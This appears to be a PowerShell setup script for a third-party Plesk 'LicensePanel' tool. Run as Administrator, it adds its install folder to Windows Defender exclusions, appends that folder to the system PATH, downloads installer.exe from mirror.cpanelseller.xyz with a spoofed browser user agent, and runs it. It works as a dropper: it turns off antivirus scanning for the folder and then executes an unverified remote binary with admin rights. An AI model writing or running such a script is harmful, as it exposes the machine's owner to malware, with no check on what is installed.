# ⚠️ Run this as Administrator

# ✅ Enable TLS 1.2 and TLS 1.3 for secure HTTPS downloads
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ✅ Define folder path
$folderPath = "C:\Program Files\LicensePanel\"
$installerPath = Join-Path $folderPath "installer.exe"
$url = "https://mirror.cpanelseller.xyz/api/files/plesk/pleskinstallerwindows"

# ✅ Create the license folder if it doesn't exist
if (!(Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
}

# ✅ Add folder to Windows Defender exclusions
if (Get-Command 'Add-MpPreference' -ErrorAction SilentlyContinue) {
    try {
        Add-MpPreference -ExclusionPath $folderPath -ErrorAction SilentlyContinue
    } catch {
        Write-Host " Could not add to Windows Defender exclusions."
    }
}

# ✅ Add license folder to system PATH (if not already)
$envPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
if ($envPath -notlike "*$folderPath*") {
    [Environment]::SetEnvironmentVariable("Path", "$envPath;$folderPath", "Machine")
    $env:Path = "$env:Path;$folderPath"
}

# ✅ Download the installer.exe with Retry Logic
$maxRetries = 3
$retryCount = 0
$success = $false

while (-not $success -and $retryCount -lt $maxRetries) {
    try {
        # Using Invoke-WebRequest for better TLS handshake handling
        Invoke-WebRequest -Uri $url -OutFile $installerPath -UserAgent $userAgent -UseBasicParsing -TimeoutSec 60
        if (Test-Path $installerPath) {
            $success = $true
            Write-Host "Downloaded installer.exe successfully."
        }
    } catch {
        $retryCount++
        if ($retryCount -lt $maxRetries) {
            Write-Host "Download failed, retrying ($retryCount/3)..."
            Start-Sleep -Seconds 3
        }
    }
}

if (-not $success) {
    Write-Host "Failed to download installer. Please check TLS or network access."
    exit 1
}

# ✅ Run the installer now
& "$installerPath"